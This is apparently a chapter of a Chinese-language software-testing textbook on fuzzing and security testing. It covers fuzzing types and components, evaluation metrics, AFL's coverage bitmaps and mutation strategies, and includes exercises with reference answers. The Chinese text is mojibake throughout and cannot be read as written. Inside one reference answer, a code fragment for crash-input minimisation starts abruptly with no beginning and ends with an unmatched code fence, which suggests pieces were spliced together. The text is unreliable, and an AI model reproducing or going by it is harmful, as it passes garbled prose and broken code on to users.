# ç¬¬17ç« ï¼šæ¨¡ç³Šæµ‹è¯•å’Œå®‰å…¨æµ‹è¯•

å®‰å…¨æ¼æ´çš„ä»£ä»·æ˜¯å·¨å¤§çš„ã€‚ä»æ•°æ®æ³„éœ²åˆ°ç³»ç»Ÿå´©æºƒï¼Œä»ç»æµæŸå¤±åˆ°å£°èª‰æŸå®³ï¼Œè½¯ä»¶å®‰å…¨é—®é¢˜å·²ç»æˆä¸ºç°ä»£è½¯ä»¶å·¥ç¨‹ä¸­ä¸å¯å¿½è§†çš„æŒ‘æˆ˜ã€‚æ¨¡ç³Šæµ‹è¯•ï¼ˆFuzzingï¼‰ä½œä¸ºä¸€ç§è‡ªåŠ¨åŒ–çš„å®‰å…¨æµ‹è¯•æŠ€æœ¯ï¼Œé€šè¿‡å‘ç¨‹åºè¾“å…¥å¤§é‡éšæœºæˆ–åŠéšæœºçš„æ•°æ®æ¥å‘ç°æ½œåœ¨çš„å®‰å…¨æ¼æ´å’Œå´©æºƒã€‚æœ¬ç« å°†æ·±å…¥æ¢è®¨æ¨¡ç³Šæµ‹è¯•çš„åŸç†ã€æŠ€æœ¯å’Œå®è·µï¼Œä»¥åŠæ›´å¹¿æ³›çš„å®‰å…¨æµ‹è¯•æ–¹æ³•ã€‚

## 17.1 æ¨¡ç³Šæµ‹è¯•åŸºç¡€

### 17.1.1 æ¨¡ç³Šæµ‹è¯•çš„å†å²å’ŒåŸç†

æ¨¡ç³Šæµ‹è¯•çš„æ¦‚å¿µå¯ä»¥è¿½æº¯åˆ°1988å¹´ï¼Œå¨æ–¯åº·æ˜Ÿå¤§å­¦çš„Barton Milleræ•™æˆåœ¨ä¸€ä¸ªé›·é›¨å¤œå‘ç°è°ƒåˆ¶è§£è°ƒå™¨çº¿è·¯ä¸Šçš„å™ªå£°å¯¼è‡´UNIXç¨‹åºå´©æºƒï¼Œä»è€Œå¼€åˆ›äº†è¿™ä¸€é¢†åŸŸã€‚

**æ ¸å¿ƒæ€æƒ³**ï¼š
- å‘ç¨‹åºè¾“å…¥éé¢„æœŸçš„ã€éšæœºçš„æˆ–ç•¸å½¢çš„æ•°æ®
- ç›‘æ§ç¨‹åºçš„å¼‚å¸¸è¡Œä¸ºï¼ˆå´©æºƒã€æŒ‚èµ·ã€å†…å­˜é”™è¯¯ç­‰ï¼‰
- è‡ªåŠ¨åŒ–åœ°æ¢ç´¢ç¨‹åºçš„è¾“å…¥ç©ºé—´
- å‘ç°å¼€å‘è€…æœªè€ƒè™‘åˆ°çš„è¾¹ç•Œæƒ…å†µ

### 17.1.2 æ¨¡ç³Šæµ‹è¯•çš„åˆ†ç±»

**1. æŒ‰ç…§è¾“å…¥ç”Ÿæˆç­–ç•¥åˆ†ç±»**

æ¨¡ç³Šæµ‹è¯•çš„è¾“å…¥ç”Ÿæˆç­–ç•¥å†³å®šäº†å…¶æ•ˆæœå’Œé€‚ç”¨åœºæ™¯ï¼š

**éšæœºæ¨¡ç³Šæµ‹è¯•ï¼ˆRandom Fuzzingï¼‰**ï¼š
- å®Œå…¨éšæœºç”Ÿæˆè¾“å…¥æ•°æ®
- ç®€å•ç›´æ¥ï¼Œæ— éœ€é¢†åŸŸçŸ¥è¯†
- é€‚ç”¨äºåˆæ­¥æ¢ç´¢å’ŒåŸºç¡€æµ‹è¯•
- æ•ˆç‡ç›¸å¯¹è¾ƒä½ï¼Œä½†å¯èƒ½å‘ç°æ„å¤–é—®é¢˜

**å˜å¼‚åŸºæ¨¡ç³Šæµ‹è¯•ï¼ˆMutation-based Fuzzingï¼‰**ï¼š
- åŸºäºç°æœ‰æœ‰æ•ˆè¾“å…¥è¿›è¡Œå˜å¼‚
- å˜å¼‚æ“ä½œåŒ…æ‹¬ï¼šä½ç¿»è½¬ã€å­—èŠ‚æ’å…¥/åˆ é™¤ã€ç®—æœ¯å˜æ¢
- ä¿ç•™è¾“å…¥çš„åŸºæœ¬ç»“æ„
- é€‚åˆæœ‰è¾“å…¥æ ·æœ¬çš„åœºæ™¯

**ç”ŸæˆåŸºæ¨¡ç³Šæµ‹è¯•ï¼ˆGeneration-based Fuzzingï¼‰**ï¼š
- åŸºäºæ ¼å¼è§„èŒƒæˆ–è¯­æ³•ç”Ÿæˆè¾“å…¥
- éœ€è¦æ·±å…¥ç†è§£è¾“å…¥æ ¼å¼
- ç”Ÿæˆçš„è¾“å…¥æ›´æœ‰é’ˆå¯¹æ€§
- é€‚åˆå¤æ‚æ ¼å¼å’Œåè®®æµ‹è¯•

**è¿›åŒ–æ¨¡ç³Šæµ‹è¯•ï¼ˆEvolutionary Fuzzingï¼‰**ï¼š
- ä½¿ç”¨é—ä¼ ç®—æ³•ä¼˜åŒ–è¾“å…¥
- æ ¹æ®åé¦ˆè°ƒæ•´ç”Ÿæˆç­–ç•¥
- æŒç»­ä¼˜åŒ–ä»¥æé«˜è¦†ç›–ç‡
- ç°ä»£æ¨¡ç³Šæµ‹è¯•çš„ä¸»æµæ–¹å‘

**2. æŒ‰ç…§ç¨‹åºçŸ¥è¯†ç¨‹åº¦åˆ†ç±»**

- **é»‘ç›’æ¨¡ç³Šæµ‹è¯•**ï¼šä¸éœ€è¦ç¨‹åºå†…éƒ¨çŸ¥è¯†
- **ç°ç›’æ¨¡ç³Šæµ‹è¯•**ï¼šåˆ©ç”¨éƒ¨åˆ†ç¨‹åºä¿¡æ¯ï¼ˆå¦‚è¦†ç›–ç‡ï¼‰
- **ç™½ç›’æ¨¡ç³Šæµ‹è¯•**ï¼šåˆ©ç”¨ç¨‹åºæºç æˆ–äºŒè¿›åˆ¶åˆ†æ

**3. æŒ‰ç…§ç›®æ ‡ç±»å‹åˆ†ç±»**

- **æ–‡ä»¶æ ¼å¼æ¨¡ç³Šæµ‹è¯•**ï¼šPDFã€å›¾ç‰‡ã€æ–‡æ¡£ç­‰
- **ç½‘ç»œåè®®æ¨¡ç³Šæµ‹è¯•**ï¼šHTTPã€TCP/IPç­‰
- **APIæ¨¡ç³Šæµ‹è¯•**ï¼šç³»ç»Ÿè°ƒç”¨ã€åº“å‡½æ•°ç­‰
- **Webåº”ç”¨æ¨¡ç³Šæµ‹è¯•**ï¼šè¡¨å•ã€URLå‚æ•°ç­‰

### 17.1.3 æ¨¡ç³Šæµ‹è¯•çš„å…³é”®ç»„ä»¶

ä¸€ä¸ªå®Œæ•´çš„æ¨¡ç³Šæµ‹è¯•ç³»ç»ŸåŒ…å«å¤šä¸ªååŒå·¥ä½œçš„ç»„ä»¶ï¼š

**1. è¾“å…¥ç”Ÿæˆå™¨ï¼ˆInput Generatorï¼‰**
- è´Ÿè´£äº§ç”Ÿæµ‹è¯•è¾“å…¥
- å®ç°å„ç§ç”Ÿæˆç­–ç•¥
- ç®¡ç†ç§å­è¾“å…¥å’Œå˜å¼‚è§„åˆ™
- ä¼˜åŒ–è¾“å…¥çš„å¤šæ ·æ€§å’Œæœ‰æ•ˆæ€§

**2. ç¨‹åºæ‰§è¡Œå™¨ï¼ˆProgram Executorï¼‰**
- å®‰å…¨éš”ç¦»åœ°æ‰§è¡Œç›®æ ‡ç¨‹åº
- æä¾›è¾“å…¥å¹¶æ•è·è¾“å‡º
- è®¾ç½®æ‰§è¡Œè¶…æ—¶å’Œèµ„æºé™åˆ¶
- æ”¯æŒå¤šç§æ‰§è¡Œç¯å¢ƒ

**3. æ‰§è¡Œç›‘æ§å™¨ï¼ˆExecution Monitorï¼‰**
- ç›‘æ§ç¨‹åºçš„è¿è¡ŒçŠ¶æ€
- æ£€æµ‹å´©æºƒã€æŒ‚èµ·ã€å¼‚å¸¸
- æ”¶é›†è¦†ç›–ç‡ä¿¡æ¯
- è®°å½•å†…å­˜ä½¿ç”¨å’Œæ€§èƒ½æ•°æ®

**4. åé¦ˆåˆ†æå™¨ï¼ˆFeedback Analyzerï¼‰**
- åˆ†ææ‰§è¡Œç»“æœçš„ä»·å€¼
- è¯„ä¼°æ–°è·¯å¾„è¦†ç›–
- è¯†åˆ«æœ‰è¶£çš„è¡Œä¸ºæ¨¡å¼
- æŒ‡å¯¼åç»­è¾“å…¥ç”Ÿæˆ

**5. å´©æºƒåˆ†ç±»å™¨ï¼ˆCrash Triagerï¼‰**
- å¯¹å´©æºƒè¿›è¡Œå»é‡å’Œåˆ†ç±»
- è¯†åˆ«ç‹¬ç‰¹çš„æ¼æ´
- è¯„ä¼°å´©æºƒçš„å¯åˆ©ç”¨æ€§
- ç”Ÿæˆç®€åŒ–çš„å¤ç°ç”¨ä¾‹

**6. è¯­æ–™åº“ç®¡ç†å™¨ï¼ˆCorpus Managerï¼‰**
- ç»´æŠ¤æœ‰æ•ˆè¾“å…¥çš„é›†åˆ
- æœ€å°åŒ–è¯­æ–™åº“è§„æ¨¡
- ä¼˜å…ˆçº§æ’åºå’Œé€‰æ‹©
- æŒä¹…åŒ–å’Œå…±äº«æœºåˆ¶

**æ¨¡ç³Šæµ‹è¯•å¾ªç¯**ï¼š
1. ç”Ÿæˆæˆ–å˜å¼‚è¾“å…¥
2. æ‰§è¡Œç›®æ ‡ç¨‹åº
3. ç›‘æ§æ‰§è¡ŒçŠ¶æ€
4. åˆ†æåé¦ˆä¿¡æ¯
5. å¤„ç†å¼‚å¸¸ç»“æœ
6. æ›´æ–°è¯­æ–™åº“

### 17.1.4 æ¨¡ç³Šæµ‹è¯•çš„æ•ˆæœè¯„ä¼°

è¯„ä¼°æ¨¡ç³Šæµ‹è¯•æ•ˆæœéœ€è¦ç»¼åˆè€ƒè™‘å¤šä¸ªç»´åº¦ï¼š

**ä¸»è¦è¯„ä¼°æŒ‡æ ‡**ï¼š

**1. ä»£ç è¦†ç›–ç‡**
- è¡Œè¦†ç›–ç‡ã€åˆ†æ”¯è¦†ç›–ç‡ã€è·¯å¾„è¦†ç›–ç‡
- è¦†ç›–ç‡å¢é•¿é€Ÿåº¦å’Œè¶‹åŠ¿
- æ–°è·¯å¾„å‘ç°ç‡
- è¾¹ç¼˜ä»£ç çš„è§¦è¾¾æƒ…å†µ

**2. å´©æºƒå‘ç°**
- ç‹¬ç‰¹å´©æºƒæ•°é‡
- å´©æºƒç±»å‹åˆ†å¸ƒ
- å¯åˆ©ç”¨æ¼æ´æ¯”ä¾‹
- å´©æºƒå‘ç°é€Ÿåº¦

**3. æ‰§è¡Œæ•ˆç‡**
- æ¯ç§’æ‰§è¡Œæ¬¡æ•°
- èµ„æºåˆ©ç”¨ç‡
- å¹¶è¡ŒåŒ–æ•ˆæœ
- è¾“å…¥ç”Ÿæˆé€Ÿåº¦

**4. è¯­æ–™åº“è´¨é‡**
- è¯­æ–™åº“å¤§å°
- è¾“å…¥å¤šæ ·æ€§
- æœ‰æ•ˆè¾“å…¥æ¯”ä¾‹
- æœ€å°åŒ–ç¨‹åº¦

**æ•ˆæœè¯„ä¼°æ–¹æ³•**ï¼š

**ç»¼åˆè¯„åˆ†è®¡ç®—**ï¼š
- è¦†ç›–ç‡å¢é•¿ï¼š40%æƒé‡
- å´©æºƒå‘ç°ï¼š40%æƒé‡
- æ‰§è¡Œæ•ˆç‡ï¼š20%æƒé‡

**æ—¶é—´åºåˆ—åˆ†æ**ï¼š
- è·Ÿè¸ªå„æŒ‡æ ‡éšæ—¶é—´çš„å˜åŒ–
- è¯†åˆ«æ”¶æ•›è¶‹åŠ¿å’Œç“¶é¢ˆ
- é¢„æµ‹æœªæ¥å‘ç°çš„å¯èƒ½æ€§

**å¯¹æ¯”åŸºå‡†**ï¼š
- ä¸å…¶ä»–æ¨¡ç³Šæµ‹è¯•å·¥å…·å¯¹æ¯”
- ä¸ä¼ ç»Ÿæµ‹è¯•æ–¹æ³•å¯¹æ¯”
- ä¸å†å²æ•°æ®å¯¹æ¯”

### ç»ƒä¹  17.1

1. **æ¦‚å¿µç†è§£**ï¼šè§£é‡Šä¸ºä»€ä¹ˆéšæœºæµ‹è¯•èƒ½å¤Ÿå‘ç°ä¼ ç»Ÿæµ‹è¯•éš¾ä»¥å‘ç°çš„bugã€‚

<details>
<summary>å‚è€ƒç­”æ¡ˆ</summary>

éšæœºæµ‹è¯•èƒ½å‘ç°ä¼ ç»Ÿæµ‹è¯•éš¾ä»¥å‘ç°çš„bugçš„åŸå› ï¼š

1. **è¾“å…¥ç©ºé—´æ¢ç´¢**ï¼š
   - ä¼ ç»Ÿæµ‹è¯•åŸºäºäººç±»æ€ç»´ï¼Œå®¹æ˜“æœ‰ç›²ç‚¹
   - éšæœºæµ‹è¯•ä¸å—å…ˆå…¥ä¸ºä¸»è§‚å¿µé™åˆ¶
   - èƒ½è§¦åŠå¼€å‘è€…æœªæƒ³åˆ°çš„è¾“å…¥ç»„åˆ
   - æ¢ç´¢è¾“å…¥ç©ºé—´çš„æ„å¤–è§’è½

2. **è¾¹ç•Œæ¡ä»¶è¦†ç›–**ï¼š
   - äººå·¥è®¾è®¡å¾€å¾€é—æ¼æŸäº›è¾¹ç•Œ
   - éšæœºè¾“å…¥å¯èƒ½æ°å¥½è§¦å‘è¾¹ç•Œé”™è¯¯
   - æ•´æ•°æº¢å‡ºã€ç¼“å†²åŒºæº¢å‡ºç­‰é—®é¢˜
   - æç«¯å€¼å’Œå¼‚å¸¸å€¼çš„ç»„åˆ

3. **çŠ¶æ€ç©ºé—´æ¢ç´¢**ï¼š
   
   ä¼ ç»Ÿæµ‹è¯•é€šå¸¸æŒ‰ç…§é¢„å®šçš„é€»è¾‘è·¯å¾„ï¼š
   - ç™»å½• â†’ æµè§ˆ â†’ è´­ä¹°
   - ç™»å½• â†’ åŠ å…¥è´­ç‰©è½¦ â†’ ç»“è´¦
   
   éšæœºæµ‹è¯•å¯èƒ½å‘ç°çš„å¼‚å¸¸è·¯å¾„ï¼š
   - ç»“è´¦ â†’ ç™»å½• â†’ åé€€ â†’ ç»“è´¦ï¼ˆçŠ¶æ€ä¸ä¸€è‡´ï¼‰
   - åŠ å…¥è´­ç‰©è½¦ â†’ åˆ é™¤ç”¨æˆ· â†’ ç»“è´¦ï¼ˆæ‚¬ç©ºå¼•ç”¨ï¼‰
   - å¹¶è¡Œç™»å½• â†’ ç«æ€æ¡ä»¶ï¼ˆå¹¶å‘é—®é¢˜ï¼‰

4. **éšå«å‡è®¾æš´éœ²**ï¼š
   - å¼€å‘è€…çš„éšå«å‡è®¾ï¼ˆå¦‚è¾“å…¥æ ¼å¼ï¼‰
   - æµ‹è¯•è€…å…±äº«ç›¸åŒå‡è®¾
   - éšæœºè¾“å…¥æ‰“ç ´è¿™äº›å‡è®¾
   - æš´éœ²é˜²å¾¡æ€§ç¼–ç¨‹çš„ç¼ºå¤±

5. **ç»„åˆçˆ†ç‚¸é—®é¢˜**ï¼š
   - å‚æ•°ç»„åˆæ•°é‡æŒ‡æ•°çº§å¢é•¿
   - äººå·¥æ— æ³•è¦†ç›–æ‰€æœ‰ç»„åˆ
   - éšæœºæµ‹è¯•æŒç»­æ¢ç´¢æ–°ç»„åˆ
   - å‘ç°ç½•è§çš„äº¤äº’é—®é¢˜

6. **æ—¶åºå’Œå¹¶å‘**ï¼š
   - éšæœºçš„æ‰§è¡Œæ—¶æœº
   - æ„å¤–çš„æ“ä½œé¡ºåº
   - ç«æ€æ¡ä»¶çš„è§¦å‘
   - æ­»é”å’Œæ´»é”çš„å‘ç°

å®ä¾‹è¯´æ˜ï¼š
- Heartbleedæ¼æ´ï¼šç®€å•çš„é•¿åº¦å­—æ®µæ“çºµ
- SQLiteçš„æ•°ç™¾ä¸ªbugï¼šAFL fuzzerå‘ç°
- Chromeçš„å®‰å…¨æ¼æ´ï¼šClusterFuzzæŒç»­å‘ç°

</details>

2. **å®è·µæ€è€ƒ**ï¼šè®¾è®¡ä¸€ä¸ªç®€å•çš„æ–‡ä»¶æ ¼å¼æ¨¡ç³Šå™¨æ¡†æ¶ã€‚

<details>
<summary>å‚è€ƒç­”æ¡ˆ</summary>

ç®€å•æ–‡ä»¶æ ¼å¼æ¨¡ç³Šå™¨æ¡†æ¶è®¾è®¡ï¼š

**æ ¸å¿ƒç»„ä»¶è®¾è®¡**ï¼š

**1. ä¸»æ§åˆ¶å™¨ï¼ˆFileFuzzerï¼‰**
- ç®¡ç†æ•´ä¸ªæ¨¡ç³Šæµ‹è¯•æµç¨‹
- ç»´æŠ¤è¯­æ–™åº“å’Œå´©æºƒé›†åˆ
- åè°ƒå„ç»„ä»¶çš„å·¥ä½œ
- æä¾›è¿›åº¦æŠ¥å‘Šå’Œç»Ÿè®¡

**2. å˜å¼‚å™¨é›†åˆï¼ˆMutatorsï¼‰**

**åŸºç¡€å˜å¼‚ç­–ç•¥**ï¼š
- **ä½ç¿»è½¬å˜å¼‚**ï¼šéšæœºç¿»è½¬æ–‡ä»¶ä¸­çš„æŸäº›ä½
- **å­—èŠ‚æ’å…¥/åˆ é™¤**ï¼šæ”¹å˜æ–‡ä»¶å¤§å°å’Œç»“æ„
- **é­”æœ¯å€¼æ›¿æ¢**ï¼šæ’å…¥è¾¹ç•Œå€¼å¦‚ 0, -1, MAX_INT
- **å—ç§»åŠ¨**ï¼šæ‰“ä¹±æ–‡ä»¶å†…éƒ¨ç»“æ„

**æ™ºèƒ½å˜å¼‚ç­–ç•¥**ï¼š
- **ç»“æ„æ„ŸçŸ¥å˜å¼‚**ï¼šåŸºäºæ–‡ä»¶æ ¼å¼è§„èŒƒ
- **é•¿åº¦å­—æ®µç‰¹æ®Šå¤„ç†**ï¼šæµ‹è¯•ç¼“å†²åŒºæº¢å‡º
- **æ ¡éªŒå’Œç ´å**ï¼šæµ‹è¯•éªŒè¯é€»è¾‘
- **å¼•ç”¨å…³ç³»ç ´å**ï¼šæµ‹è¯•æŒ‡é’ˆå¤„ç†

**3. æ‰§è¡Œç›‘æ§å™¨ï¼ˆExecutionMonitorï¼‰**

**ç›‘æ§èƒ½åŠ›**ï¼š
- **å´©æºƒæ£€æµ‹**ï¼šæ•è·å„ç§ä¿¡å·ï¼ˆSIGSEGV, SIGABRTç­‰ï¼‰
- **è¶…æ—¶å¤„ç†**ï¼šé˜²æ­¢æ— é™å¾ªç¯æˆ–æŒ‚èµ·
- **èµ„æºç›‘æ§**ï¼šå†…å­˜ä½¿ç”¨ã€CPUå ç”¨
- **è¾“å‡ºæ•è·**ï¼šæ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡º

**4. å´©æºƒåˆ†æå™¨ï¼ˆCrashAnalyzerï¼‰**

**åˆ†æåŠŸèƒ½**ï¼š
- **å´©æºƒå»é‡**ï¼šåŸºäºå †æ ˆç­¾åè¯†åˆ«ç‹¬ç‰¹å´©æºƒ
- **ä¸¥é‡çº§åˆ«è¯„ä¼°**ï¼šåŒºåˆ†å¯åˆ©ç”¨æ¼æ´
- **è¾“å…¥æœ€å°åŒ–**ï¼šä½¿ç”¨Delta Debuggingç®—æ³•
- **å´©æºƒåˆ†ç±»**ï¼šæŒ‰ç±»å‹ç»„ç»‡å´©æºƒä¿¡æ¯

**æ¡†æ¶å·¥ä½œæµç¨‹**ï¼š

1. **åˆå§‹åŒ–é˜¶æ®µ**
   - åŠ è½½ç›®æ ‡ç¨‹åºå’Œæ–‡ä»¶æ ¼å¼è§„èŒƒ
   - å‡†å¤‡åˆå§‹è¯­æ–™åº“
   - é…ç½®å˜å¼‚å™¨å’Œç›‘æ§å™¨

2. **æ¨¡ç³Šæµ‹è¯•å¾ªç¯**
   - é€‰æ‹©ç§å­è¾“å…¥ï¼ˆä»è¯­æ–™åº“æˆ–éšæœºç”Ÿæˆï¼‰
   - åº”ç”¨å˜å¼‚ç­–ç•¥ç”Ÿæˆæ–°è¾“å…¥
   - æ‰§è¡Œç›®æ ‡ç¨‹åºå¹¶ç›‘æ§
   - åˆ†æç»“æœå¹¶æ›´æ–°çŠ¶æ€

3. **ç»“æœå¤„ç†**
   - å´©æºƒåˆ†æå’Œå»é‡
   - æœ‰è¶£è¾“å…¥åŠ å…¥è¯­æ–™åº“
   - ç”Ÿæˆæµ‹è¯•æŠ¥å‘Š
   - ä¿å­˜å¤ç°ç”¨ä¾‹
            
            if self.still_crashes(candidate1, signature):
                current = candidate1
            elif self.still_crashes(candidate2, signature):
                current = candidate2
            else:
                # éœ€è¦æ›´ç»†ç²’åº¦çš„åˆ é™¤
                break
        
        return current

# ä½¿ç”¨ç¤ºä¾‹
def example_usage():
    # åˆ›å»ºPNGæ–‡ä»¶æ¨¡ç³Šå™¨
    png_fuzzer = FileFuzzer(
        target_program="/usr/bin/image_viewer",
        file_format="PNG"
    )
    
    # æ·»åŠ ç§å­æ–‡ä»¶
    png_fuzzer.add_seed_files("./seeds/png/")
    
    # è¿è¡Œæ¨¡ç³Šæµ‹è¯•
    png_fuzzer.fuzz(iterations=10000)
    
    # ç”ŸæˆæŠ¥å‘Š
    png_fuzzer.generate_report("fuzzing_report.html")
```

è¿™ä¸ªæ¡†æ¶åŒ…å«ï¼š
1. å¤šç§å˜å¼‚ç­–ç•¥
2. æ‰§è¡Œç›‘æ§
3. å´©æºƒåˆ†æå’Œå»é‡
4. æµ‹è¯•ç”¨ä¾‹æœ€å°åŒ–
5. ç»“æ„æ„ŸçŸ¥å˜å¼‚
6. å¯æ‰©å±•çš„æ¶æ„

</details>

### è¿›ä¸€æ­¥ç ”ç©¶

1. å¦‚ä½•è®¾è®¡ä¸€ä¸ªé«˜æ•ˆçš„ç§å­è°ƒåº¦ç®—æ³•æ¥æœ€å¤§åŒ–ä»£ç è¦†ç›–ç‡ï¼Ÿ
2. ç¬¦å·æ‰§è¡Œä¸æ¨¡ç³Šæµ‹è¯•å¦‚ä½•ç»“åˆä»¥å…‹æœå„è‡ªçš„å±€é™æ€§ï¼Ÿ
3. å¦‚ä½•å°†æœºå™¨å­¦ä¹ åº”ç”¨äºæŒ‡å¯¼æ¨¡ç³Šæµ‹è¯•çš„è¾“å…¥ç”Ÿæˆï¼Ÿ

## 17.2 ç°ä»£æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯

### 17.2.1 è¦†ç›–ç‡å¼•å¯¼çš„æ¨¡ç³Šæµ‹è¯•

è¦†ç›–ç‡å¼•å¯¼ï¼ˆCoverage-Guidedï¼‰æ˜¯ç°ä»£æ¨¡ç³Šæµ‹è¯•çš„æ ¸å¿ƒæŠ€æœ¯ï¼Œé€šè¿‡ç›‘æ§ä»£ç è¦†ç›–ç‡æ¥æŒ‡å¯¼è¾“å…¥ç”Ÿæˆã€‚

**è¦†ç›–ç‡å¼•å¯¼æ¨¡ç³Šå™¨çš„æ ¸å¿ƒæ¶æ„**ï¼š

**ä¸»è¦ç»„ä»¶**ï¼š
- **ç›®æ ‡ç®¡ç†å™¨**ï¼šç»´æŠ¤è¢«æµ‹è¯•çš„äºŒè¿›åˆ¶ç¨‹åºï¼Œå¤„ç†ç¨‹åºçš„åŠ è½½å’Œåˆå§‹åŒ–
- **è¯­æ–™åº“ç®¡ç†**ï¼šä½¿ç”¨é›†åˆæ•°æ®ç»“æ„å­˜å‚¨æœ‰ä»·å€¼çš„è¾“å…¥æ ·æœ¬ï¼Œé¿å…é‡å¤
- **è¦†ç›–ç‡æ˜ å°„**ï¼šè®°å½•å·²å‘ç°çš„ä»£ç è·¯å¾„ï¼Œç”¨äºåˆ¤æ–­æ–°è¾“å…¥çš„ä»·å€¼
- **ä¼˜å…ˆçº§é˜Ÿåˆ—**ï¼šæ ¹æ®è¾“å…¥çš„"æœ‰è¶£ç¨‹åº¦"è¿›è¡Œæ’åºï¼Œä¼˜å…ˆå¤„ç†é«˜ä»·å€¼è¾“å…¥

**å…³é”®åŠŸèƒ½æ¨¡å—**ï¼š

1. **ç¨‹åºæ’æ¡©ï¼ˆInstrumentationï¼‰**
   - ç¼–è¯‘æ—¶æ’æ¡©ï¼šåœ¨æºç ç¼–è¯‘é˜¶æ®µæ³¨å…¥ç›‘æ§ä»£ç 
   - åŠ¨æ€äºŒè¿›åˆ¶æ’æ¡©ï¼šè¿è¡Œæ—¶ä¿®æ”¹äºŒè¿›åˆ¶ä»£ç 
   - æ’æ¡©ç‚¹é€‰æ‹©ï¼šåŸºæœ¬å—å…¥å£ã€åˆ†æ”¯è·³è½¬ã€å‡½æ•°è°ƒç”¨
   - æ€§èƒ½ä¼˜åŒ–ï¼šæœ€å°åŒ–æ’æ¡©å¼€é”€ï¼Œé¿å…å½±å“ç¨‹åºè¡Œä¸º

2. **è¾“å…¥æ‰§è¡Œå’Œç›‘æ§**
   - æ‰§è¡Œç¯å¢ƒéš”ç¦»ï¼šä½¿ç”¨æ²™ç®±æˆ–è™šæ‹ŸåŒ–æŠ€æœ¯
   - è¦†ç›–ç‡æ•°æ®æ”¶é›†ï¼šå®æ—¶è·å–ä»£ç æ‰§è¡Œè·¯å¾„
   - å¼‚å¸¸æ£€æµ‹ï¼šæ•è·å´©æºƒã€è¶…æ—¶ã€èµ„æºè€—å°½
   - ç»“æœåˆ†æï¼šåˆ¤æ–­æ‰§è¡Œç»“æœçš„ä»·å€¼

3. **è¦†ç›–ç‡åˆ†æç®—æ³•**
   - è·¯å¾„å“ˆå¸Œè®¡ç®—ï¼šå°†æ‰§è¡Œè·¯å¾„è½¬æ¢ä¸ºå”¯ä¸€æ ‡è¯†
   - æ–°è·¯å¾„æ£€æµ‹ï¼šæ¯”è¾ƒå½“å‰è·¯å¾„ä¸å†å²è®°å½•
   - è¾¹è¦†ç›–ç»Ÿè®¡ï¼šè®°å½•æ§åˆ¶æµå›¾ä¸­è¾¹çš„æ‰§è¡Œæ¬¡æ•°
   - å¢é‡æ›´æ–°ï¼šé«˜æ•ˆç»´æŠ¤è¦†ç›–ç‡æ•°æ®ç»“æ„

**AFLï¼ˆAmerican Fuzzy Lopï¼‰çš„æ ¸å¿ƒç®—æ³•**ï¼š

**AFLç®—æ³•çš„æ ¸å¿ƒè®¾è®¡ç†å¿µ**ï¼š

AFLä½¿ç”¨äº†ä¸€ç§åˆ›æ–°çš„è¦†ç›–ç‡è®°å½•æ–¹æ³•ï¼Œä¸»è¦ç‰¹ç‚¹åŒ…æ‹¬ï¼š

1. **åŒä½å›¾æ¶æ„**
   - **Virginä½å›¾**ï¼šè®°å½•æ•´ä¸ªæ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­è§è¿‡çš„æ‰€æœ‰è¦†ç›–æƒ…å†µ
   - **Traceä½å›¾**ï¼šè®°å½•å•æ¬¡æ‰§è¡Œçš„è¦†ç›–æƒ…å†µ
   - **ä½å›¾å¤§å°**ï¼šé€šå¸¸ä¸º64KBï¼Œåœ¨æ•ˆç‡å’Œç²¾åº¦é—´å–å¾—å¹³è¡¡

2. **æ‰§è¡Œæ¬¡æ•°åˆ†æ¡¶ç­–ç•¥**
   - å°†è¿ç»­çš„æ‰§è¡Œæ¬¡æ•°æ˜ å°„åˆ°ç¦»æ•£çš„æ¡¶ä¸­
   - æ¡¶çš„åˆ’åˆ†ï¼š0æ¬¡ã€1æ¬¡ã€2æ¬¡ã€3æ¬¡ã€4-7æ¬¡ã€8-15æ¬¡ã€16-31æ¬¡ã€32-127æ¬¡ã€128+æ¬¡
   - é¿å…å¯¹å°å¹…åº¦è®¡æ•°å˜åŒ–è¿‡åº¦æ•æ„Ÿ
   - å‡å°‘æ— æ„ä¹‰çš„"æ–°è¦†ç›–"åˆ¤æ–­

3. **è¦†ç›–ç‡åˆ¤æ–­æœºåˆ¶**
   - æ¯”è¾ƒå½“å‰æ‰§è¡Œçš„traceä½å›¾ä¸å†å²virginä½å›¾
   - åªæœ‰å½“æŸä¸ªè·¯å¾„çš„æ‰§è¡Œæ¬¡æ•°è·¨è¶Šæ¡¶è¾¹ç•Œæ—¶æ‰è®¤ä¸ºæ˜¯æ–°è¦†ç›–
   - è¿™ç§è®¾è®¡å¤§å¤§å‡å°‘äº†è¯­æ–™åº“è†¨èƒ€
   - æé«˜äº†æ¨¡ç³Šæµ‹è¯•çš„æ•ˆç‡

4. **æ€§èƒ½ä¼˜åŒ–æŠ€å·§**
   - ä½¿ç”¨å­—èŠ‚æ•°ç»„è€Œéæ›´å¤æ‚çš„æ•°æ®ç»“æ„
   - ä½æ“ä½œå’Œç®€å•æ¯”è¾ƒå®ç°å¿«é€Ÿåˆ¤æ–­
   - å†…å­˜è¿ç»­è®¿é—®æé«˜ç¼“å­˜å‘½ä¸­ç‡
   - é¿å…ä¸å¿…è¦çš„å†…å­˜åˆ†é…

### 17.2.2 å˜å¼‚ç­–ç•¥ä¼˜åŒ–

ç°ä»£æ¨¡ç³Šæµ‹è¯•å™¨ä½¿ç”¨å¤šç§æ™ºèƒ½å˜å¼‚ç­–ç•¥ï¼š

**æ™ºèƒ½å˜å¼‚ç­–ç•¥çš„åˆ†ç±»ä¸å®ç°**ï¼š

ç°ä»£æ¨¡ç³Šæµ‹è¯•å™¨ç»¼åˆä½¿ç”¨å¤šç§å˜å¼‚ç­–ç•¥ï¼Œæ¯ç§ç­–ç•¥æœ‰å…¶ç‹¬ç‰¹çš„ä¼˜åŠ¿å’Œé€‚ç”¨åœºæ™¯ï¼š

**1. ç¡®å®šæ€§å˜å¼‚ï¼ˆDeterministic Mutationsï¼‰**
- **ç³»ç»ŸåŒ–éå†**ï¼šæŒ‰ç…§é¢„å®šä¹‰çš„æ¨¡å¼ç³»ç»Ÿåœ°ä¿®æ”¹è¾“å…¥
- **ä½çº§åˆ«æ“ä½œ**ï¼š
  - å•ä½ç¿»è½¬ï¼šé€ä¸ªç¿»è½¬è¾“å…¥ä¸­çš„æ¯ä¸€ä½
  - åŒä½ç¿»è½¬ï¼šåŒæ—¶ç¿»è½¬ç›¸é‚»çš„ä¸¤ä½
